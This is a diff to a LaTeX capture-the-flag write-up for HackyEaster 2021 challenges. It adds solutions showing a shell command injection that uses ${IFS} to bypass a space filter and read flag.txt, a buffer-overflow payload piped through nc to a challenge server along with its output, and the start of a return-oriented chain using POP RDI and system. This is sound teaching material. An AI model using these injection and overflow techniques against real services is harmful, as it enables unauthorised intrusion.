@@ -479,8 +479,8 @@ Get it with \verb+nc 46.101.107.117 2105+
 
 Note: The service is restarted every hour at x:00.
 
-\hypertarget{he21.11-solution}{%
-\subsection{HE21.11 Solution}\label{he21.11-solution}}
+\hypertarget{he21.12-solution}{%
+\subsection{HE21.12 Solution}\label{he21.12-solution}}
 
 Logging into the service spews out a picture of an egg, but with no
 writing.  Dumping the output into a file shows that it contains mostly
@@ -597,7 +597,24 @@ into the call \verb+$(ls /)+, but this is rejected
 \verb+nice try - www.youtube.com/watch?v=a4eav7dFvc8+. However, we
 resist the urge to click on this url.
 
-Interestingly, \verb+$(ls)+ gives us the help screen for \verb+nc+.  
+Interestingly, \verb+$(ls)+ gives us the help screen for \verb+nc+.  So the url
+is passed on to \verb+nc+ and it is interpreted before by the shell.  So let us
+interpret the output of \verb+ls+ as a string (\verb+"$(ls)"+)and see what it
+does:
+\begin{verbatim}
+nc: bad address 'bg.jpg
+check.php
+flag.txt
+index.php'
+\end{verbatim}
+
+There is a file \verb+flag.txt+ in the directory, so we can show its contents
+with \verb+"$(cat${IFS}flag.txt)"+.  The IFS is necessary to bypass the
+detection of spaces.  And we get the flag
+
+\begin{verbatim}
+nc: bad address 'he2021{1ts_fun_t0_1nj3kt_k0mmand5}'
+\end{verbatim}
 
 \hypertarget{he21.16}{%
   \section{HE21.16 LOTL}
@@ -626,7 +643,6 @@ function with a classic buffer overflow problem from using \verb+gets+:
 
 \begin{minted}{c}
 undefined8 main(void)
-
 {
   char pwn_me [32];
   
@@ -650,27 +666,25 @@ void profit(void)
 }
 \end{minted}
 
-In the binary are also entry points for the \verb+system+ function at address
-\verb+0x00400610+ and the string \verb+/bin/sh+ is stored at \verb+0x00400978+.
-So we can construct a shell escape.  Let us first test that we can call the
-\verb+printf+ function with the \verb+/bin/sh+ as an argument:
-
-Search for ``return to libc exploit'' or ``one gadget exploit'' to
-get the proper documentation.
+So it should be easy to construct the payload: load 32 bytes for the buffer, 8
+bytes for the RBP and then 8 bytes for the RIP.  However, this does not work.
+In the end, it turns out that the binary did not match the challenge and only a
+padding of 32 bytes was needed:
 
 \begin{verbatim} 
-brp(DESKTOP-FH3H4P9)253$ printf "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDD\x2c\x08\x40\x00\x00\x00\x00\x00\n" | nc 46.101
-.107.117 2102
+printf "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDD\x6d\x08\x40\x00\x00\x00\x00\x00\nls -l\ncat flag\n" |
+nc 46.101.107.117 2102
 Welcome! Please give me your name!
-> Hi AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDD@, nice to meet you!
-Welcome! Please give me your name!
-> [!] Anti DoS Signal. Patch me out for testing.
-brp(DESKTOP-FH3H4P9)254$
+> Hi AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDD@, nice to meet you!
+total 36
+-rwxrwxr-x 1 root root  8848 Mar  2 18:30 challenge1
+-rw-rw-r-- 1 root root    40 Mar  2 18:30 flag
+-rwxrwxr-x 1 root root 18744 Mar  2 18:30 ynetd
+he2021{w3ll_th4t_w4s_4_s1mpl3_p4yl04d}
 \end{verbatim} 
 
-So we can execute printf twice...
+The flag is \verb+he2021{w3ll_th4t_w4s_4_s1mpl3_p4yl04d}+
 
-Now call system with an argument of /bin/sh
 
 \hypertarget{he21.17}{%
   \section{HE21.17 Digizzled}
@@ -1483,9 +1497,36 @@ file \verb+sailorsknot+ provided.
 \hypertarget{he21.29-solution}{%
 \subsection{HE21.29 Solution}\label{he21.29-solution}}
 
-\noindent 
+\noindent Disassembly of the main function looks the same as in
+Challenge~\ref{he21.16}.  So we can again overflow a string to jump anywhere in
+the binary.  The function \verb+profit()+ is missing though.  On the other
+hand, there is a strange function \verb+remove_me_before_deploy()+ that is
+followed by some junk.  Disassembling the junk shows that there is one part
+that calls \verb+system("/bin/ls")+, so this should give us at least something
+to work with.
 
+\begin{figure}
+    \includegraphics[width=150mm]{ch29/remove_me_before_deploy.png}
+\end{figure}
 
+\begin{verbatim}
+$ printf "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDEEEEEEEE\xc5\x07\x40\x00\x00\x00\x00\x00\nls -l\n" | nc
+ 46.101.107.117 2112
+Welcome! Please give me your name!
+> Hi AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDEEEEEEEE@, nice to meet you!
+challenge2
+flag
+ynetd
+\end{verbatim} 
+
+So we get the listing and see that there is a file names \verb+flag+.  Again,
+we have to find a way to print the flag.
+
+Looking again at the junk after \verb+remove_me_before_deploy()+, we seen that
+there is a \verb+POP RDI+ that we can use to load \verb+RDI+ from the stack and
+if we jump directly to \verb+system+ further below, we can execute this
+function with a string that we control.  So we have to build up a stack that
+matches this requirement.
 
 \hypertarget{he21.30}{%
 \section{HE21.30 Pix FX}
